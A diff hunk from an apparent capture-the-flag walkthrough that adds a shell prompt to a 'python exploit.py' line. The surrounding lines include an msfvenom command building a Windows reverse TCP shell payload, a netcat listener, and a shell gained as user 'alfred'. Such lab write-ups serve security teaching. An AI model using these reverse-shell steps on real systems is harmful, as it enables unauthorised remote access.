@@ -78,7 +78,7 @@ $ msfvenom -p windows/shell_reverse_tcp -a x86 --platform Windows LHOST=10.10.14
 After creating this payload and modifying the script with it, we can setup a nc listener and launch the exploit
 
 ```shell
-python exploit.py
+$ python exploit.py
 ```
 
 Checking back on the listener we see we have a shell as alfred
